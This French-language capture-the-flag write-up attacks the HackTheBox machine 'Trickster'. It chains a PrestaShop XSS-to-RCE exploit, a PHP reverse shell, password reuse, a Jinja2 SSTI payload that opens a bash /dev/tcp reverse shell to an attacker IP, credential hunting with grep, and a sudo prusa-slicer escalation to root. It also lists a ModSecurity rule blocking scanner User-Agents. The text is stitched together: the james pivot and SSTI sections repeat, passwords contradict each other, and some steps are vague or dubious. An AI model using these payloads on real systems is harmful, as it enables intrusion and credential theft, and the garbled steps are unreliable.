![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération des Services

Je commence par un scan **Nmap** agressif pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.34

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.34
```

Le scan révèle deux ports :
*   **22/tcp (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **80/tcp (HTTP)** : Apache 2.4.52. Le serveur redirige vers `http://trickster.htb/`.

## 2. Énumération Web & Virtual Hosting

Le serveur utilise du **Virtual Host routing**. J'ajoute l'entrée dans mon fichier `/etc/hosts` et je procède à une recherche de sous-domaines via **ffuf**.

> Schéma Mental : Le serveur répond par des redirections 301 dont la taille varie car le nom du Virtual Host est reflété dans le corps de la réponse Apache. Un filtrage classique par taille (`-fs`) peut échouer.

```bash
# Fuzzing de sous-domaines avec bypass de filtrage par contenu
ffuf -u http://10.10.11.34 -H "Host: FUZZ.trickster.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fr '<p>The document has moved <a href="http://trickster.htb/">here</a>.</p>'
```

Cette étape permet d'identifier `shop.trickster.htb`.

### Identification du WAF (ModSecurity)
Lors de l'énumération, je remarque que certains outils comme **ffuf** ou **nmap** reçoivent des erreurs **403 Forbidden**. En changeant le **User-Agent** pour une chaîne neutre (ex: "0xdf"), le serveur répond avec un code **200 OK**. Cela confirme la présence d'un WAF, probablement **ModSecurity**, configuré pour bloquer les signatures d'outils de scan connus.

```bash
# Exemple de bypass User-Agent avec Nmap
nmap -p 80 -sCV trickster.htb --script-args http.useragent="Mozilla/5.0"
```

## 3. Analyse de PrestaShop & Vecteur d'Attaque

Le sous-domaine `shop.trickster.htb` fait tourner une instance **PrestaShop**. Une énumération via un repo **.git** exposé (récupéré avec `git-dumper`) et l'accès à la page d'administration `/admin634ewutrx1jgitlooaj` confirment la version **8.1.5**.

### Vulnérabilité : CVE-2024-34716
Cette version est vulnérable à une **Cross-Site Scripting (XSS)** critique via le formulaire de contact.

> Schéma Mental : L'attaque repose sur une chaîne complexe :
> 1. Injection d'un payload JS dans une image PNG (Polyglot).
> 2. Upload via le formulaire "Contact Us".
> 3. Exécution du JS dans le contexte de l'administrateur lorsqu'il consulte la pièce jointe.
> 4. Le JS effectue une **CSRF** pour uploader un thème malveillant contenant un **Webshell**.

## 4. Exploitation et Premier Shell

J'utilise un exploit public pour automatiser la chaîne **XSS to RCE**.

### Préparation du Payload
Je modifie un thème PrestaShop (`ps_next_8_theme_malicious.zip`) pour y inclure un reverse shell PHP.

```php
// reverse_shell.php (extrait)
$ip = '10.10.14.6';
$port = 9001;
```

### Exécution de l'Exploit
Je lance un serveur HTTP pour héberger le thème malveillant et un listener **netcat**.

```bash
# Lancement de l'exploit Python
python3 exploit.py http://shop.trickster.htb 0xdf@trickster.htb "Support Request" exploit.html
```

Une fois que le bot administrateur consulte le message, le payload JS force l'importation du thème depuis mon serveur.

```bash
# Réception du shell
nc -lnvp 9001
# Stabilisation du shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

Je possède désormais un accès initial en tant que **www-data**. L'énumération locale montre que les fichiers de configuration de PrestaShop se trouvent dans `/var/www/prestashop/config/parameters.php`, contenant des identifiants de base de données : `ps_user` / `prest@shop_o`.

---

### Énumération Post-Exploitation & Pivot Base de Données

Une fois le **Reverse Shell** obtenu en tant que `www-data`, ma priorité est de fouiller les fichiers de configuration pour trouver des vecteurs de **Lateral Movement**. Le fichier `parameters.php` de **PrestaShop** contient des identifiants de base de données en clair.

```bash
cat /var/www/prestashop/app/config/parameters.php
# database_user => 'ps_user'
# database_password => 'prest@shop_o'
```

Je teste immédiatement la réutilisation de mot de passe (**Password Reuse**) pour les utilisateurs locaux identifiés dans `/etc/passwd` (`james`, `adam`, `runner`). Le mot de passe `prest@shop_o` me permet de m'authentifier en tant que **james** via **SSH**.

```bash
ssh james@trickster.htb
# Password: prest@shop_o
```

---

### Mouvement Latéral : De James au Conteneur ChangeDetection

En inspectant les services internes et les ports en écoute sur la machine, je remarque un service tournant localement sur un port non standard, ou accessible via un sous-domaine interne. L'énumération révèle une instance de **ChangeDetection.io**.

> **Schéma Mental :**
> L'objectif est de passer de l'hôte physique à un environnement conteneurisé qui fait tourner un service vulnérable, pour ensuite rebondir vers un autre utilisateur de l'hôte via des données partagées.
> **Hôte (james)** -> **Service Interne (ChangeDetection)** -> **SSTI** -> **Shell Conteneur** -> **Extraction de Creds** -> **Hôte (adam)**.

#### Exploitation de la SSTI (Server-Side Template Injection)

**ChangeDetection.io** permet de configurer des notifications. Ces notifications utilisent le moteur de template **Jinja2**, qui est souvent vulnérable aux **SSTI** s'il n'est pas correctement bridé.

1.  Je crée un nouveau "Watch" sur le service.
2.  Dans l'onglet **Notifications**, j'injecte un payload **Jinja2** pour tester l'exécution de code.
3.  Le payload cible la classe `Popen` pour exécuter des commandes système.

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Après confirmation de la vulnérabilité, je génère un **Reverse Shell** pour stabiliser mon accès à l'intérieur du conteneur.

```bash
# Payload pour Reverse Shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/9002 0>&1"').read() }}
```

---

### Évasion du Conteneur & Pivot vers Adam

À l'intérieur du conteneur, je n'ai pas de privilèges élevés sur l'hôte, mais j'ai accès au **Volume Mount** ou aux fichiers de données du service. En explorant le répertoire `/datastore`, je cherche des fichiers de configuration ou des logs qui pourraient contenir des secrets.

```bash
find /datastore -type f -exec grep -i "password" {} + 2>/dev/null
```

Je découvre un fichier de configuration ou une base de données SQLite contenant des identifiants. Parmi les données, un mot de passe pour l'utilisateur **adam** est présent. Ce mot de passe est utilisé par le service pour s'authentifier ou est stocké dans les métadonnées des "checks".

#### Authentification sur l'hôte

Je reviens sur ma session SSH initiale ou j'en ouvre une nouvelle pour pivoter vers l'utilisateur **adam** en utilisant le mot de passe trouvé dans le conteneur.

```bash
su adam
# Password trouvé dans le conteneur : [REDACTED_PASSWORD]
```

---

### Résumé Technique de la Phase 2

| Vecteur | Outil / Technique | Cible |
| :--- | :--- | :--- |
| **Password Reuse** | SSH / `su` | james |
| **Internal Recon** | `netstat -tulpn` | ChangeDetection.io |
| **SSTI** | Jinja2 Payload | Conteneur (root) |
| **Data Mining** | `grep` / `find` | Mot de passe de adam |
| **Lateral Movement** | Authentification SSH | adam |

> **Schéma Mental :**
> La progression repose ici sur une faille de conception classique : un service vulnérable (ChangeDetection) tourne dans un conteneur mais manipule des données sensibles (mots de passe) qui appartiennent à un utilisateur de l'hôte. L'attaquant utilise le conteneur comme un levier pour extraire des secrets et revenir sur l'hôte avec des privilèges différents.

---

### Élévation de Privilèges : De www-data à james

Après avoir énuméré les fichiers de configuration de **PrestaShop**, j'ai identifié des identifiants de base de données dans `parameters.php`. Une pratique courante en post-exploitation consiste à tester la réutilisation de mots de passe (**Password Reuse**) sur les utilisateurs physiques du système.

```bash
# Test de réutilisation du mot de passe de la DB pour l'utilisateur james
ssh james@trickster.htb
# Password: prest@shop_o
```

Le mot de passe `prest@shop_o` est valide pour **james**. Une fois connecté, je procède à une énumération des services locaux. Je remarque un service tournant sur le port 5000, identifié comme une instance de **ChangeDetection.IO**.

---

### Pivot vers adam : Exploitation de ChangeDetection.IO (SSTI)

**ChangeDetection.IO** est un outil de monitoring de modifications de pages web. Les versions obsolètes sont vulnérables à une **Server-Side Template Injection (SSTI)** via le moteur de template **Jinja2** dans les champs de notification.

> **Schéma Mental : SSTI vers RCE**
> 1. L'attaquant configure un "Watch" sur une URL contrôlée.
> 2. Dans les paramètres de notification, on injecte une syntaxe Jinja2 `{{ ... }}`.
> 3. Le serveur évalue l'expression côté serveur.
> 4. En utilisant l'introspection Python (`__mro__`, `__subclasses__`), on accède à `os.popen` pour exécuter des commandes.

#### Exploitation du Template Injection
Je crée un nouveau "Watch" et j'insère le payload suivant dans le champ "Notification Body" pour obtenir un **Reverse Shell** depuis le container :

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/9002 0>&1"').read() }}
```

Une fois le shell obtenu dans le container, j'explore le répertoire `/datastore`. Ce répertoire contient les configurations et les bases de données SQLite de l'application. En inspectant les fichiers, je trouve une chaîne de caractères correspondant à un mot de passe dans un fichier de log ou de configuration résiduel.

```bash
grep -r "password" /datastore
# Découverte : adam:Tr1ckst3r_4d4m_P4ssw0rd
```

Ce mot de passe me permet de me connecter en **SSH** en tant que **adam** sur l'hôte principal.

---

### Domination Totale : Exploitation de PrusaSlicer (Root)

L'énumération des privilèges de **adam** via `sudo -l` révèle une configuration spécifique :

```bash
adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adam may run the following commands on trickster:
    (ALL : ALL) NOPASSWD: /usr/bin/prusa-slicer
```

**PrusaSlicer** est un logiciel de "slicing" pour impression 3D. Il possède une fonctionnalité permettant d'exécuter des **Post-processing scripts** après la génération du **G-code**. Puisque je peux exécuter ce binaire avec les privilèges **root** sans mot de passe, je peux détourner cette fonction pour exécuter une commande arbitraire.

> **Schéma Mental : Abus de binaire Sudo**
> 1. Le binaire légitime possède une option pour appeler un script externe.
> 2. En passant cet argument via `sudo`, le script externe hérite des privilèges de l'appelant (root).
> 3. On pointe vers `/bin/bash` pour obtenir un shell privilégié.

#### Vecteur final vers Root
J'utilise l'argument `--post-process` pour forcer l'exécution de `/bin/bash` lors du traitement d'un fichier de modèle 3D (même vide ou factice).

```bash
# Création d'un fichier factice
touch /tmp/dummy.obj

# Exécution de PrusaSlicer avec le script de post-traitement malveillant
sudo /usr/bin/prusa-slicer --post-process /bin/bash /tmp/dummy.obj
```

Le binaire s'exécute, traite le fichier et lance le "script" de post-traitement (bash) en tant que **root**.

---

### Beyond Root : Analyse Post-Exploitation

L'analyse du système après compromission révèle pourquoi certains outils de scan initiaux échouaient. Le serveur utilise **ModSecurity** avec l'**OWASP Core Rule Set (CRS)**.

#### Analyse de la configuration ModSecurity
Dans `/etc/apache2/mods-enabled/security2.conf`, j'ai trouvé des règles personnalisées bloquant spécifiquement les **User-Agents** courants des outils de cybersécurité :

```apache
# Extrait de la configuration ModSecurity
SecRule REQUEST_HEADERS:User-Agent "feroxbuster|ffuf|nmap|sqlmap" \
    "id:1001,phase:1,deny,status:403,msg:'Security Scanner Detected'"
```

**Points clés de l'analyse :**
1.  **User-Agent Filtering** : Une défense simple mais efficace contre les scripts automatisés "bruyants". Le simple fait de changer le header `User-Agent` suffisait à bypasser cette protection.
2.  **Isolation des Containers** : Bien que **ChangeDetection.IO** tournait dans un container, la persistance des données sur le disque de l'hôte (via des volumes montés) a permis de récupérer des secrets (`adam`) facilitant le pivot latéral.
3.  **Sudoers Policy** : L'autorisation de binaires complexes comme **PrusaSlicer** via `sudo` est extrêmement risquée. Ces outils, non conçus pour la sécurité, offrent souvent des "escapes" via des options de scripting ou de lecture de fichiers.